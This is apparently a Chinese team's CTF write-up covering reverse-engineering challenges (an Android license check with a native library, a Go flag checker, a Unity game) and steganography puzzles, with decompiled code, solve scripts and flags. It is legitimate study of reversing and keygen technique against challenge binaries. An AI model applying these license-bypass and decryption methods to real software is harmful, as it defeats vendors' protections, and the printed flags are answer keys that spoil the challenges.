        button.setOnClickListener(new View.OnClickListener() { // from class: F0.c
            /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
            /* JADX WARN: Removed duplicated region for block: B:8:0x005d  */
            @Override // android.view.View.OnClickListener
            /*
                Code decompiled incorrectly, please refer to instructions dump.
            */
            public final void onClick(View view) {
                a aVar;
                Object bVar;
                int i2 = LoginActivity.f1808v;
                S0.c cVar = b.f198a;
                String string = editText.getText().toString();
                String string2 = editText2.getText().toString();
                O0.c.e(string, "usernameInput");
                O0.c.e(string2, "licenseInput");
                String string3 = j.E0(string).toString();
                Locale locale = Locale.US;
                O0.c.d(locale, "US");
                String upperCase = string3.toUpperCase(locale);
                O0.c.d(upperCase, "toUpperCase(...)");
                S0.c cVar2 = b.f198a;
                cVar2.getClass();
                Matcher matcher = cVar2.f431a.matcher(upperCase);
                O0.c.d(matcher, "matcher(...)");
                F.c cVar3 = !matcher.matches() ? null : new F.c(matcher, upperCase);
                if (cVar3 == null) {
                    aVar = null;
                } else {
                    String upperCase2 = j.E0(string2).toString().toUpperCase(locale);
                    O0.c.d(upperCase2, "toUpperCase(...)");
                    S0.c cVar4 = b.b;
                    cVar4.getClass();
                    if (cVar4.f431a.matcher(upperCase2).matches()) {
                        if (((S0.b) cVar3.f172c) == null) {
                            cVar3.f172c = new S0.b(cVar3);
                        }
                        S0.b bVar2 = (S0.b) cVar3.f172c;
                        O0.c.b(bVar2);
                        String str = (String) bVar2.get(1);
                        String strC0 = j.C0(upperCase2, "-", "");
                        StringBuilder sb = new StringBuilder();
                        for (int i3 : b.f199c) {
                            sb.append(strC0.charAt(i3));
                        }
                        String string4 = sb.toString();
                        O0.c.d(string4, "toString(...)");
                        String strNativeVerify = NativeBridge.f1809a.nativeVerify(str, string4);
                        O0.c.e(strNativeVerify, "<this>");
                        for (int i4 = 0; i4 < strNativeVerify.length(); i4++) {
                            char cCharAt = strNativeVerify.charAt(i4);
                            if (!Character.isWhitespace(cCharAt) && !Character.isSpaceChar(cCharAt)) {
                                String strConcat = "EMP2026".concat(str);
                                int[] iArr = {7, 8, 9, 10, 0, 3, 6, 2};
                                StringBuilder sb2 = new StringBuilder();
                                for (int i5 = 0; i5 < 8; i5++) {
                                    sb2.append(strConcat.charAt(iArr[i5]));
                                }
                                String string5 = sb2.toString();
                                O0.c.d(string5, "toString(...)");
                                aVar = new a(string5, strNativeVerify);
                            }
                        }
                        aVar = null;
                    }
                }
                TextView textView2 = textView;
                LoginActivity loginActivity = this;
                if (aVar == null) {
                    textView2.setText(loginActivity.getString(R.string.invalid_auth));
                    textView2.setVisibility(0);
                    return;
                }
                try {
                    bVar = h.E(loginActivity, aVar.f197c);
                } catch (Throwable th) {
                    bVar = new G0.b(th);
                }
                String str2 = (String) (bVar instanceof G0.b ? null : bVar);
                if (str2 == null || str2.length() == 0) {
                    textView2.setText(loginActivity.getString(R.string.invalid_auth));
                    textView2.setVisibility(0);
                } else {
                    textView2.setVisibility(8);
                    loginActivity.startActivity(new Intent(loginActivity, (Class<?>) ReportActivity.class).putExtra("report_text", str2));
                }
            }
        });
    }
}

```

简化后：

```java
String username = editText.getText().toString().trim().toUpperCase(US);
// b.f198a = ^EMP-2026-(\d{4})$
Matcher m1 = Pattern.compile("^EMP-2026-(\\d{4})$").matcher(username);
if (!m1.matches()) return invalid();
String userId = m1.group(1);          // 4 位数字

String license = inputLicense.getText().toString().trim().toUpperCase(US);
// b.b = ^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$
if (!Pattern.compile("^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$").matcher(license).matches())
    return invalid();

// 去 '-', 按 perm 拷贝出 string4
String strC0 = license.replace("-", "");
int[] perm = {5,2,9,0,11,3,7,1,10,4,8,6};   // F0/b.java#f199c
StringBuilder sb = new StringBuilder();
for (int i : perm) sb.append(strC0.charAt(i));
String string4 = sb.toString();

// 调 native
String nativeSeed = NativeBridge.f1809a.nativeVerify(userId, string4);
if (nativeSeed.isBlank()) return invalid();

// localSeed = ("EMP2026"+userId) 按 [7,8,9,10,0,3,6,2] 重排
String base = "EMP2026" + userId;
int[] idxs = {7,8,9,10,0,3,6,2};
StringBuilder sb2 = new StringBuilder();
for (int i : idxs) sb2.append(base.charAt(idxs[i]));
String localSeed = sb2.toString();

String authMaterial = localSeed + ":" + nativeSeed;
String report = h.E(this, authMaterial);    // 解密 report.enc
```

**2\.2 解密函数\`A\.h\.E\`**

![Image](./images/img-082.png)

```java
byte[] ct  = Base64.decode(read("assets/report.enc"), 0);
byte[] key = SHA-256(authMaterial.getBytes(UTF_8))[0..*16*];
byte[] iv  = MD5("PatrolNote-IV".getBytes(UTF_8));
return new String(
    AES("AES/CBC/PKCS5Padding").init(DECRYPT, key, iv).doFinal(ct),
    UTF_8);
```

```text

key 长度只取 16 字节 → AES-128-CBC。
```

**三、Native 层逆向（\`libpatrolnote\.so\` arm64\-v8a）**

RM64 反汇编核心片段（删去 `kotlin string` 的 SSO 处理，把 `userId[i]`、`string4[i]` 还原后）：

![Image](./images/img-083.png)

![Image](./images/img-084.png)

```text

; 1. 校验 userId.length() == 4
;    userId[2]=='1' userId[0]=='7' userId[3]=='3' userId[1]=='4'
;    => userId == "7413"
CMP X8, #4 ; B.NE invalid
LDRB W10, [userId+2] ; CMP #0x31  '1'
LDRB W9 , [userId+0] ; CMP #0x37  '7'
LDRB W13, [userId+3] ; CMP #0x33  '3'
LDRB W11, [userId+1] ; CMP #0x34  '4'

; 2. 校验 string4.length() == 12
;    string4[1]='M' string4[2]='5' string4[3]='Q' string4[4]='D'
;    string4[5]='2' string4[6]='A' string4[7]='7' string4[8]='K'
;    string4[9]='L' string4[10]='T' string4[11]='X'
;    string4[0]='9'  (来自后面 ^0x77 = 'N' 推出，但其实第一位也通过比较得到)
CMP X12, #0xC                          ; len==12
... CMP #'9', 'M', '5', 'Q', 'D', '2', 'A', '7', 'K', 'L', 'T', 'X'
; => string4 == "9M5QD2A7KLTX"
```

（汇编里第 0 位的比较被 fold 进了后面一组 EOR 校验，结合各位置一一对应也能直接读出 `9`，整段语义就是逐字节硬比较。）

通过后构造长度为 8 的返回字符串：

```text
push_back( string4[0] ^ 0x77 )    -> '9' ^ 0x77 = 'N'
push_back( userId[1]  )           -> '4'
push_back( string4[10] )          -> 'T'
push_back( userId[2]  )           -> '1'
push_back( string4[6] ^ 0x17 )    -> 'A' ^ 0x17 = 'V'
push_back( userId[3]  )           -> '3'
push_back( string4[8]  )          -> 'K'
push_back( userId[0] + 2 )        -> '7' + 2 = '9'
```

```text
nativeSeed = "N4T1V3K9"   (即 "NATIVE" 主题的 leet)
```

**四、还原 license**

`string4` = `9M5QD2A7KLTX`，已知

```text
string4[i] = strC0[ perm[i] ],   perm = [5,2,9,0,11,3,7,1,10,4,8,6]
```

反向填回：

```text
strC0[5]=9, strC0[2]=M, strC0[9]=5, strC0[0]=Q, strC0[11]=D,
strC0[3]=2, strC0[7]=A, strC0[1]=7, strC0[10]=T, strC0[4]=L,
strC0[8]=X, strC0[6]=K
strC0 = "Q7M2L9KAX5TD"... 
```

实际跑脚本得：

```text
strC0     = Q7M2 L9XA T5KD
license   = Q7M2-L9XA-T5KD
username  = EMP-2026-7413
```

**五、解密\`assets/report\.enc\`**

```text
authMaterial = localSeed + ":" + nativeSeed
             = "7413E26P:N4T1V3K9"
key (hex) = 4b1b456b333b3f00d1582f61739b3ab8       // SHA256(authMaterial)[:16]
iv  (hex) = 0099d1155812de307a328a74445f9c0a       // MD5("PatrolNote-IV")
```

**解题脚本**

```python
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# ---------------------------------------------------------------
# 1. native 校验 (libpatrolnote.so) 中硬编码的明文
#    userId  ->  "7413"
#    string4 ->  "9M5QD2A7KLTX"
# ---------------------------------------------------------------
USER_ID = "7413"
STRING4 = "9M5QD2A7KLTX"

# ---------------------------------------------------------------
# 2. 还原 license:
#    Java 层先去掉 '-', 然后按 perm 取 char:
#        string4[i] = strC0[ perm[i] ]
#    反向写回 strC0, 再按 4-4-4 加 '-'
# ---------------------------------------------------------------
PERM = [5, 2, 9, 0, 11, 3, 7, 1, 10, 4, 8, 6]
strC0 = [""] * 12
for i, p in enumerate(PERM):
    strC0[p] = STRING4[i]
strC0 = "".join(strC0)
license_dashed = f"{strC0[0:4]}-{strC0[4:8]}-{strC0[8:12]}"

print("Username :", f"EMP-2026-{USER_ID}")
print("License  :", license_dashed)

# ---------------------------------------------------------------
# 3. native 算出的 nativeSeed (8 chars)
#    push_back 顺序如反汇编所示:
#       string4[0]  ^ 0x77
#       userId[1]
#       string4[10]
#       userId[2]
#       string4[6]  ^ 0x17
#       userId[3]
#       string4[8]
#       userId[0]   + 2
# ---------------------------------------------------------------
nativeSeed = "".join([
    chr(ord(STRING4[0])  ^ 0x77),
    USER_ID[1],
    STRING4[10],
    USER_ID[2],
    chr(ord(STRING4[6])  ^ 0x17),
    USER_ID[3],
    STRING4[8],
    chr(ord(USER_ID[0]) + 2),
])
print("nativeSeed:", nativeSeed)

# ---------------------------------------------------------------
# 4. localSeed = ("EMP2026" + userId) 按 [7,8,9,10,0,3,6,2] 重排
# ---------------------------------------------------------------
base = "EMP2026" + USER_ID
local_idx = [7, 8, 9, 10, 0, 3, 6, 2]
localSeed = "".join(base[i] for i in local_idx)
print("localSeed :", localSeed)

# ---------------------------------------------------------------
# 5. authMaterial = localSeed + ":" + nativeSeed
#    AES-128-CBC / PKCS5
#       key = SHA256(authMaterial)[:16]
#       iv  = MD5("PatrolNote-IV")
# ---------------------------------------------------------------
authMaterial = f"{localSeed}:{nativeSeed}"
print("authMaterial:", authMaterial)

key = hashlib.sha256(authMaterial.encode()).digest()[:16]
iv = hashlib.md5(b"PatrolNote-IV").digest()

# ---------------------------------------------------------------
# 6. 读取 assets/report.enc 并解密
# ---------------------------------------------------------------
with open("apk_extract/assets/report.enc", "rb") as f:
    ct_b64 = f.read().strip()
ct = base64.b64decode(ct_b64)

pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)
print("\n=== Decrypted Report ===")
print(pt.decode("utf-8"))

```

![Image](./images/img-085.png)

H\&NCTF\{dd8a63b2bf2ac5d46070553f27f3b09a\}





## 题目名称：Hexgate

解题人：weixiao

解题过程：

**题目信息**

附件只有一个 `hexgate.exe`。用 `objdump -x` 或 `strings` 可以看到：

```text
file format pei-x86-64
Go build ID: "..."
main.main
main.printBanner
main.verify
main.allLowerHex
main.rol8
main.swapNibble
```

因此这是一个 Go 编译的 Windows x64 校验程序，核心逻辑在 `main.verify`。

**基本行为**

直接运行程序：

![Image](./images/img-086.png)

`main.verify` 开头先检查输入格式：

```asm language
cmp    $0x28,%rbx              ; 长度 40
movabs $0x7b465443434e2648,%rdx
cmp    %rcx,%rdx               ; 前 7 字节
cmpb   $0x7d,0x27(%rax)        ; 最后一字节为 }
```

常量 `0x7b465443434e2648` 按小端解释是：

```text
48 26 4e 43 54 46 7b = H&NCTF{
```

之后程序从第 7 字节开始检查 32 字节内容，要求全部是小写十六进制字符，所以 flag 形如：

```text
H&NCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

**数据表**

核心校验使用了 `.data` 中的 5 张 32 字节表：

```text
0x140187860: 426d91f01ca75833d27e0bc46519afe137885dc924b6704ade139bf52e618c47
0x140187880: 9e2b71c844f216ad53803ce728956ad00fb17d22c649fa348b15e0679c4ed538
0x1401878a0: 11843acf56e27b19a540d72c986ef103bc5724da8f31c56b10e4792f935ad846
0x1401878c0: 1ba5d9aac6515d0da40124a4aff57ed3491679df890cdf23b72611011def7a2b
0x1401878e0: 09041500111e0c190713021c0e17051f01100a1b031208180d1d06140b1a0f16
```

最后一张是置换表：

```python
perm = [9, 4, 21, 0, 17, 30, 12, 25, 7, 19, 2, 28, 14, 23, 5, 31,
        1, 16, 10, 27, 3, 18, 8, 24, 13, 29, 6, 20, 11, 26, 15, 22]
```

**校验逻辑**

根据反汇编可还原出两个 key 的生成逻辑。

第一层 key：

```python
key1[i] = rol8(table_b[(31 - 3*i) & 31] ^ table_a[(5*i + 7) & 31] ^ (11*i + 0x3d), (i % 7) + 1)
```

第二层 key：

```python
x = table_c[perm[i]] + 9*i + 0x21
key2[i] = bit_reverse(x) ^ (0xa5 - 3*i)
```

对输入中间 32 字节 `m` 的正向校验可以写成：

```python
stage1[i] = rol8(m[i] ^ key1[i], (i % 5) + 1)
stage2[i] = stage1[perm[i]]
check[i] = swap_nibble(stage2[i]) ^ key2[i] ^ (17*i + 0x5c)
check == target
```

其中 `swap_nibble(x)` 是高低 4 bit 互换；`rol8(x, n)` 是 8 位循环左移。

**反推**

上述操作都是可逆的，按相反顺序还原：

```python
stage2[i] = swap_nibble(target[i] ^ key2[i] ^ (17*i + 0x5c))
stage1[perm[i]] = stage2[i]
m[i] = ror8(stage1[i], (i % 5) + 1) ^ key1[i]
```

得到中间 32 字节：

```text
45f8b8bb847fb232fb667c0832a6af09
```

```python
from pathlib import Path
import struct

IMAGE_BASE = 0x140000000

def rol8(x, n):
    n %= 8
    return ((x << n) | (x >> (8 - n))) & 0xFF

def ror8(x, n):
    n %= 8
    return ((x >> n) | (x << (8 - n))) & 0xFF

def swap_nibble(x):
    return ((x >> 4) | ((x & 0x0F) << 4)) & 0xFF

def bit_reverse(x):
    x = ((x & 0xF0) >> 4) | ((x & 0x0F) << 4)
    x = ((x & 0xCC) >> 2) | ((x & 0x33) << 2)
    x = ((x & 0xAA) >> 1) | ((x & 0x55) << 1)
    return x & 0xFF

class PEImage:
    def __init__(self, path):
        self.path = Path(path)
        self.data = self.path.read_bytes()
        self.sections = self._parse_sections()

    def _parse_sections(self):
        e_lfanew = struct.unpack_from("<I", self.data, 0x3C)[0]
        if self.data[e_lfanew:e_lfanew + 4] != b"PE\0\0":
            raise ValueError("not a PE file")

        num_sections = struct.unpack_from("<H", self.data, e_lfanew + 6)[0]
        opt_size = struct.unpack_from("<H", self.data, e_lfanew + 20)[0]
        section_table = e_lfanew + 24 + opt_size

        sections = []
        for i in range(num_sections):
            off = section_table + i * 40
            name = self.data[off:off + 8].rstrip(b"\0").decode("ascii", "ignore")
            virtual_size, virtual_address, raw_size, raw_ptr = struct.unpack_from(
                "<IIII", self.data, off + 8
            )
            sections.append((name, virtual_address, virtual_size, raw_ptr, raw_size))
        return sections

    def va_to_offset(self, va):
        rva = va - IMAGE_BASE
        for name, section_rva, virtual_size, raw_ptr, raw_size in self.sections:
            span = max(virtual_size, raw_size)
            if section_rva <= rva < section_rva + span:
                return raw_ptr + (rva - section_rva)
        raise ValueError(f"VA not mapped: {va:#x}")

    def read_va(self, va, size):
        off = self.va_to_offset(va)
        return self.data[off:off + size]

def solve(path="hexgate.exe"):
    pe = PEImage(path)

    # Tables referenced in main.verify/main helper routines.
    table_a = list(pe.read_va(0x140187860, 32))
    table_b = list(pe.read_va(0x140187880, 32))
    table_c = list(pe.read_va(0x1401878A0, 32))
    target = list(pe.read_va(0x1401878C0, 32))
    perm = list(pe.read_va(0x1401878E0, 32))

    key1 = []
    for i in range(32):
        x = table_b[(31 - 3 * i) & 31] ^ table_a[(5 * i + 7) & 31] ^ ((11 * i + 0x3D) & 0xFF)
        key1.append(rol8(x, (i % 7) + 1))

    key2 = []
    for i in range(32):
        x = (table_c[perm[i]] + 9 * i + 0x21) & 0xFF
        key2.append(bit_reverse(x) ^ ((0xA5 - 3 * i) & 0xFF))

    stage2 = []
    for i in range(32):
        stage2.append(swap_nibble(target[i] ^ key2[i] ^ ((17 * i + 0x5C) & 0xFF)))

    stage1 = [0] * 32
    for i, p in enumerate(perm):
        stage1[p] = stage2[i]

    middle = []
    for i in range(32):
        middle.append(ror8(stage1[i], (i % 5) + 1) ^ key1[i])

    middle = bytes(middle)
    if not all(c in b"0123456789abcdef" for c in middle):
        raise ValueError(f"decoded middle is not lower hex: {middle!r}")

    flag = b"H&NCTF{" + middle + b"}"
    return flag.decode()

if __name__ == "__main__":
    print(solve())

```

![Image](./images/img-087.png)

H\&NCTF\{45f8b8bb847fb232fb667c0832a6af09\}







## 题目名称：Game

解题人：weixiao

解题过程：

题目给的是一个 Unity Windows 游戏目录，提示为：

```text
上下左右移动视角，注意：如果是玩通关的话需要通关页面截图，需要截到当前通关的时间（通关后会显示）
```

题目目录中主要文件如下：

```text
TowerDefense-GameFramework-Demo.exe
UnityPlayer.dll
UnityCrashHandler64.exe
MonoBleedingEdge/
TowerDefense-GameFramework-Demo_Data/
```

这是典型 Unity Mono 游戏结构。Unity Mono 游戏的业务逻辑通常在：

```text
TowerDefense-GameFramework-Demo_Data/Managed/Assembly-CSharp.dll
```

先对其进行分析做字符串搜索：

![Image](./images/img-088.png)

```powershell
strings -el -n 3 TowerDefense-GameFramework-Demo_Data\Managed\Assembly-CSharp.dll |
  Select-String -Pattern "Ctf|Flag|flag|BuildFull|LoadedFlag|time|finish|success" -CaseSensitive:$false
```

可以看到几个非常关键的字符串：

```text
CtfFlagChallenge
m_LoadedFlag
BuildFullFlag
FLAG PART {0}/{1}: {2}
FULL FLAG:
Current Time
```

这里基本可以确定：flag 不是在地图里随机藏着，而是有一个专门的 `CtfFlagChallenge` 类负责通关后显示 flag

**反编译 Assembly\-CSharp\.dll**

用 ILSpy 命令行反编译：

```powershell
dotnet tool install --global ilspycmd --version 8.2.0.7535
ilspycmd -p -o decompiled TowerDefense-GameFramework-Demo_Data\Managed\Assembly-CSharp.dll
```

然后搜索关键类：

```powershell
rg -n "class CtfFlagChallenge|BuildFullFlag|FLAG PART|FULL FLAG|Current Time" decompiled
```

定位到：

```text
decompiled/Flower/CtfFlagChallenge.cs
decompiled/Flower/UIGameOverForm.cs
```

**通关页面逻辑**

`UIGameOverForm.cs` 里成功分支逻辑如下：

```c#
case EnumGameOverType.Success:
{
    title.text = string.Format(GameEntry.Localization.GetString("Level Complete"), uIGameOverFormOpenParam.LevelData.Name);
    title.text = $"{title.text}\n<size=24>{arg}</size>";
    string clearMessage = CtfFlagChallenge.GetClearMessage(data.CurrentLevelIndex, data.MaxLevel);
    if (!string.IsNullOrEmpty(clearMessage))
    {
        title.text = $"{title.text}\n<size=26>{clearMessage}</size>";
    }
    GameEntry.Sound.PlaySound(EnumSound.TDVictory);
    break;
}
```

`arg` 的生成方式是：

```c#
string arg = string.Format(
    GameEntry.Localization.GetString("Current Time"),
    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
);
```

所以题目提示里说的“通关后会显示当前通关时间”就在这里。

同时可以看到，通关页面会调用：

```c#
CtfFlagChallenge.GetClearMessage(data.CurrentLevelIndex, data.MaxLevel)
```

因此 flag 关键逻辑就在 `CtfFlagChallenge`。

**lag 显示逻辑**

反编译得到的 `CtfFlagChallenge.cs` 关键内容如下：

```c#
private static readonly string[] FragmentCipherTexts = new string[5]
{
    "dCQ0aeTWu+M=",
    "IrV0QzjF+p4=",
    "+Y+SXYILQ2U=",
    "0jTBuKupi5A=",
    "6ndQ+FXKPLk="
};

private static readonly byte[] KeySeed = new byte[8]
{
    67, 17, 154, 5, 126, 211, 44, 97
};

private static readonly byte[] KeyMask = new byte[8]
{
    24, 39, 53, 74, 89, 108, 114, 143
};
```

通关某一关时，`GetClearMessage` 会显示当前关卡对应的 fragment：

```c#
string fragment = GetFragment(currentLevelIndex);
string text = $"FLAG PART {currentLevelIndex}/{num}: {fragment}";
```

如果所有关卡都有星级记录，则拼接完整 flag：

```c#
if (HasClearedAllLevels(num))
{
    text = $"{text}\nFULL FLAG:\n{BuildFullFlag(num)}";
}
```

这里的 `HasClearedAllLevels` 不是解密条件，只是 UI 显示完整 flag 的条件：

```c#
private static bool HasClearedAllLevels(int totalLevelCount)
{
    for (int i = 1; i <= totalLevelCount; i++)
    {
        if (GameEntry.Setting.GetInt($"Setting.Level{i}LevelStarRecord", 0) <= 0)
        {
            return false;
        }
    }
    return true;
}
```

也就是说，只要静态复现 `GetFragment(i)`，不需要真的打通全部关卡。

**解密函数**

`GetFragment` 如下：

```c#
private static string GetFragment(int levelIndex)
{
    byte[] bytes = Rc4Utility.Transform(
        Convert.FromBase64String(FragmentCipherTexts[levelIndex - 1]),
        BuildKey(levelIndex)
    );
    return Encoding.UTF8.GetString(bytes);
}
```

解密流程是：

1. 取第 `levelIndex` 个 Base64 字符串。

2. Base64 解码得到密文字节。

3. 用 `BuildKey(levelIndex)` 生成 RC4 key。

4. 调用 `Rc4Utility.Transform` 解密。

5. UTF\-8 解码得到 flag 片段。

`BuildKey` 如下：

```c#
private static byte[] BuildKey(int levelIndex)
{
    byte[] array = new byte[KeySeed.Length + 4];
    for (int i = 0; i < KeySeed.Length; i++)
    {
        array[i] = (byte)((uint)(KeySeed[i] ^ KeyMask[i]) ^ ((uint)((levelIndex + 3) * (i + 11)) & 0xFFu));
    }
    array[KeySeed.Length] = (byte)(49 + levelIndex * 3);
    array[KeySeed.Length + 1] = (byte)(0x57u ^ (uint)levelIndex);
    array[KeySeed.Length + 2] = (byte)(160 - levelIndex * 7);
    array[KeySeed.Length + 3] = (byte)(92 + levelIndex * 5);
    return array;
}
```

所以每一关的 RC4 key 都不同，由关卡编号派生。

`Rc4Utility.Transform` 是标准 RC4 KSA \+ PRGA：

```c#
public static byte[] Transform(byte[] data, byte[] key)
{
    byte[] array = new byte[256];
    for (int i = 0; i < array.Length; i++)
    {
        array[i] = (byte)i;
    }

    int num = 0;
    for (int j = 0; j < array.Length; j++)
    {
        num = (num + array[j] + key[j % key.Length]) & 0xFF;
        Swap(array, j, num);
    }

    byte[] array2 = new byte[data.Length];
    int num2 = 0;
    num = 0;
    for (int k = 0; k < data.Length; k++)
    {
        num2 = (num2 + 1) & 0xFF;
        num = (num + array[num2]) & 0xFF;
        Swap(array, num2, num);
        array2[k] = (byte)(data[k] ^ array[(array[num2] + array[num]) & 0xFF]);
    }
    return array2;
}
```

因此只需要把 `FragmentCipherTexts`、`KeySeed`、`KeyMask`、`BuildKey` 和 RC4 复现到脚本里。

**解题脚本**

```python
#!/usr/bin/env python3
import base64

FRAGMENT_CIPHERTEXTS = [
    "dCQ0aeTWu+M=",
    "IrV0QzjF+p4=",
    "+Y+SXYILQ2U=",
    "0jTBuKupi5A=",
    "6ndQ+FXKPLk=",
]

KEY_SEED = [67, 17, 154, 5, 126, 211, 44, 97]
KEY_MASK = [24, 39, 53, 74, 89, 108, 114, 143]

def build_key(level_index: int) -> bytes:
    key = []
    for i, seed in enumerate(KEY_SEED):
        v = seed ^ KEY_MASK[i] ^ (((level_index + 3) * (i + 11)) & 0xFF)
        key.append(v & 0xFF)

    key.append((49 + level_index * 3) & 0xFF)
    key.append((0x57 ^ level_index) & 0xFF)
    key.append((160 - level_index * 7) & 0xFF)
    key.append((92 + level_index * 5) & 0xFF)
    return bytes(key)

def rc4(data: bytes, key: bytes) -> bytes:
    s = list(range(256))
    j = 0

    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]

    out = bytearray()
    i = 0
    j = 0
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) & 0xFF])

    return bytes(out)

def get_fragment(level_index: int) -> str:
    data = base64.b64decode(FRAGMENT_CIPHERTEXTS[level_index - 1])
    return rc4(data, build_key(level_index)).decode("utf-8")

def main() -> None:
    parts = []
    for level_index in range(1, len(FRAGMENT_CIPHERTEXTS) + 1):
        part = get_fragment(level_index)
        parts.append(part)
        print(f"part {level_index}: {part}")

    print("flag:", "".join(parts))

if __name__ == "__main__":
    main()

```

![Image](./images/img-089.png)

![Image](./images/img-090.png)

H\&NCTF\{0cc94984ed9fba684ff6cf165b2c9eec\}







# Misc

## 题目名称：雪中刀盾

解题人：Lu0m0

解题过程：

下载附件，得到key和png，png中左下角存在提示：ilovectf

然后key是：xor:66666666 ，这个应该是后面要与某个东西xor得到key之类的

![Image](./images/img-091.png)

010查看png，发现后面多了010数据和被魔改的zip数据

![Image](./images/img-092.png)

先处理010得到自定义的base64编码表，应该是后面用的：

```text
01234ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz56789+/

```

然后修复zip,得到txt，根据提示推断是snow隐写，我们提取一下

![Image](./images/img-093.png)

需要密码，尝试前面的66666666和ilove都不对，然后xor这两个得到就是key

![Image](./images/img-094.png)

\_ZY@SUBP

![Image](./images/img-095.png)

```text
N2UJLwMBZuMpWyYaXv5qYw9uWe1ySyIpWt4cDSv=
```

最后base64解密：H\&NCTF\{4now\_sNow\_sn0w\_sno\!\!\!\}

![Image](./images/img-096.png)

```text
H&NCTF{4now_sNow_sn0w_sno!!!}
```



## 题目名称：pnumber穿越小记

解题人：Lu0m0

解题过程：

随波逐流检查一下发现里面含很多文件，我们foremost一下看看，得到三种文件

![Image](./images/img-097.png)

010检查png，发现中藏了一个可疑的数据块steg，好像在提示steg隐写

![Image](./images/img-098.png)

将其提取一下，发现里面藏了png zip

![Image](./images/img-099.png)

png没有，zip提取出来里面是js\.txt，但加密了，需要找密码。刚好随波逐流中检测到了key相关信息，一个mp3

![Image](./images/img-100.png)

然后看mp3的频谱图发现摩斯密码，解密得到key,解压拿到flag

```text
KEY:ASD79DA12EDBQW78
flag:H&NCTF{Sciuoe72-mbhyu809_k1ut1-n90sh_18sdb}
```

![Image](./images/img-101.png)

## 题目名称：星夜回声档案

解题人：Lu0m0

解题过程：

得到一个加密的zip，然后尝试爆破无果。可能是隐形伪加密，尝试将加密位改为未加密，成功解密

010查看一下，发现末尾有个倒置的base64，解密一下

![Image](./images/img-102.png)

得到提示：

```json
{
  "hint": {
    "offset": 128,
    "size": 169,
    "method": "rot13"
  },
  "ppm": {
    "offset": 1024,
    "size": 989094,
    "method": "reverse"
  },
  "wav": {
    "offset": 990118,
    "size": 60044,
    "method": "xor",
    "key": 35
  }
}
```

根据提示提取出这三个信息or数据文件

```python
import codecs

data = open("cosmic_archive.dat", "rb").read()

meta = {
    "hint": {"offset": 128, "size": 169, "method": "rot13"},
    "ppm": {"offset": 1024, "size": 989094, "method": "reverse"},
    "wav": {"offset": 990118, "size": 60044, "method": "xor", "key": 35},
}

# hint
h = data[meta["hint"]["offset"]:meta["hint"]["offset"] + meta["hint"]["size"]]
h = codecs.decode(h.decode(), "rot13")
open("hint.txt", "w", encoding="utf-8").write(h)

# ppm
p = data[meta["ppm"]["offset"]:meta["ppm"]["offset"] + meta["ppm"]["size"]]
p = p[::-1]
open("star.ppm", "wb").write(p)

# wav
w = data[meta["wav"]["offset"]:meta["wav"]["offset"] + meta["wav"]["size"]]
w = bytes([x ^ meta["wav"]["key"] for x in w])
open("echo.wav", "wb").write(w)
```

hint是：

只看最亮的星的路径

回声是诚实的，因为它会重复。

假音比真音更响。

```text
The sky does not hide words in plain sight.
Only the brightest points remember the route.
The echo is honest because it repeats.
A false note is louder than a true one
```

对于png，我们提取像素值大于240的：max\(r, g, b\) \>= 240 

```python
from PIL import Image
from collections import Counter

img = Image.open(r"C:\Users\chenz\Downloads\Starry_Echo_Archive\star.ppm").convert("RGB")

w, h = img.size

bits = []

for y in range(h):
    for x in range(w):
        r, g, b = img.getpixel((x, y))

        # 只取高亮星点
        if max(r, g, b) >= 240:
            bits.append(r & 1)
            bits.append(g & 1)
            bits.append(b & 1)

# 每 8 bit 转成一个字节，按高位在前
out = bytearray()

for i in range(0, len(bits) - 7, 8):
    byte = 0
    for bit in bits[i:i + 8]:
        byte = (byte << 1) | bit
    out.append(byte)

print(out)
```

![Image](./images/img-103.png)

得到flag1：

flag\{F4k3\_Zip\_St4rs\_

然后后面提示：节奏：c8:2a

意思是后面音频部分按 `0xc8 = 200` 的节奏处理，2a是用于xor的key。



写脚本处理，测试发现每个 block 的第 `137` 个采样点在变换，说明这个地方是藏信息的

```python
import wave

with wave.open(r"C:\Users\chenz\Downloads\Starry_Echo_Archive\echo.wav", "rb") as f:
    samples = f.readframes(f.getnframes())

block_size = 0xc8
pos = 137

res = []

for i in range(0, len(samples), block_size):
    block = samples[i:i + block_size]
    if len(block) < block_size:
        continue
    v = block[pos]
    # 0xde 是 false note，过滤
    if v == 0xde:
        continue
    ch = v ^ 0x2a
    # 只保留可打印字符
    if 32 <= ch <= 126:
        res.append(ch)

print(bytes(res))
```

![Image](./images/img-104.png)

得到第二部分flag

```text
And_C0sm1c_Ech0}
```

拼接：

```text
flag{F4k3_Zip_St4rs_And_C0sm1c_Ech0}
```

# 



## 题目名称：寻找牢大之路

解题人：weixiao

解题过程：

可以下载模组

https://github\.com/etianl/meteor\-client\-1\.20\.4

然后mc

安装1\.20\.4  4yrfuy，把模组jar包拖入安装即可

![Image](./images/img-105.png)

第一阶段拿到的是：

compass\_chicken

神秘指南针Ⅰ

第一关杀只剩鸡\-小鸡，获得初步升级，并给了链甲套和武器 镐鸡

第二阶段指南针变为：

compass\_laoxiao

神秘指南针Ⅱ

第二关杀牢小\-蜘蛛，获得整体升级，获得了飞行猿套装、鸡泥态美和寻找牢大之路

第三关杀牢大\-大僵尸

拿到flag

flag\{13b99c7fe2df53c495905648cdc16229\}

![Image](./images/img-106.png)







## 题目名称：base玩明白了

解题人：wewixiao

解题过程:

一张图片，一个加密的压缩包

题面提示是 BBBBig5???，而 jpg 文件名里有 00txt64key，说明重点大概率在图片尾部、编码转换和 base64 key 上。

先检查 jpg 末尾，发现 JPEG 的 FFD9 结束标记后面还有 8 字节尾随数据：

```c++
00 c4 65 40 cc 76 b7 9b
```

去掉开头的 00 后得到：

```c++
c4 65 40 cc 76 b7 9b
```

![Image](./images/img-107.png)

